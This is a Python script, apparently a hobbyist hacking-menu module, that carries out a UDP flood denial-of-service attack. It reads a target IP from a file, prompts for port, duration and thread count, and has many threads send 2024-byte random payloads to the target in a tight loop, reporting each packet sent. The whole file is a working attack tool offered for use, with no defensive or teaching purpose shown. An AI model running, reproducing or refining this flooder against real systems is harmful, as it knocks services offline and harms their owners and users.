import socket
import random
import time
import os
import threading

def dos(attack_time, port, target, random_bytes):
    yellow = "\033[33m"
    reset = "\033[0m"
    green = "\033[32m"
    red = "\033[31m" 

    start_time = time.time() + attack_time
    package = 0

    temp = 0
    while temp < 10:
        try:
            if time.time() > start_time:
                print(f"{green}[+] Attack duration completed successfully. Total packages sent: {package}.{reset}")
                break
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(random_bytes, (target, port))
                package += 1
                print(f"{yellow}[#] Package {package} sent to {target}:{port}{reset}")
        except Exception as e:
            temp += 1
            print(f"{red}[!] Error: {str(e)}. Attempting {10 - temp} more times...{reset}")

    if temp == 10:
        print(f"{red}[!] Attack could not be continued due to repeated errors. Please check the target IP: {target} and Port: {port}.{reset}")
    

try:
    yellow = "\033[33m"
    reset = "\033[0m"
    green = "\033[32m"
    red = "\033[31m"

    os.system("clear")
    string = f"{red}≿━━━━━━━━━━━━━━━━━━━━━━━━━━༺❀{reset} By YAY {red}❀༻━━━━━━━━━━━━━━━━━━━━━━━━━━≾{reset}"
    print(string)

    with open("Options/target_ip.txt", "r") as file:
        target = file.read()

    default_port = 80
    while True:
        port_input = input(f"{yellow}[?] Please enter the target PORT (or press Enter to use default 80): {reset}")
        if port_input.strip() == "":
            port = default_port
            break
        elif port_input.isdigit():
            port = int(port_input)
            break
        else:
            print(f"{red}[!] Invalid input. Please enter a valid port number.{reset}")


    while True:
        try:
            attack_time = int(input(f"{yellow}Enter the attack duration in seconds: {reset}"))
            break
        except:
            print(f"{red}[!] Please enter numbers only. Invalid input detected.{reset}")

    threads_len_temp = 10
    while True:
        threads_input = input(f"{yellow}[?] Please enter the threads number (or press Enter to use default {threads_len_temp}): {reset}")
        if threads_input.strip() == "":
            threads_len = threads_len_temp
            break
        elif threads_input.isdigit():
            threads_input = int(threads_input)
            if threads_input >= 50:
                temp = input(f"{red}[!] WARNING! You entered a very large {reset}threads{red} value. It may strain your system. Do you want to continue? (y/N): {reset}").lower()
                if temp == "y":
                    threads_len = threads_input
                    break
                else:
                    print(f"{red}[!] Operation cancelled. Please enter a smaller value.{reset}")
            else:
                threads_len = threads_input
                break
        else:
            print(f"{red}[!] Invalid input. Please enter a valid number.{reset}")


    bytes = random._urandom(2024)

    thread_list = []
    for i in range(threads_len):
        thread = threading.Thread(target=dos, args=(attack_time, port, target, bytes,))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

    input("\n\n\nPress enter to continue...")
except KeyboardInterrupt:
    exit()
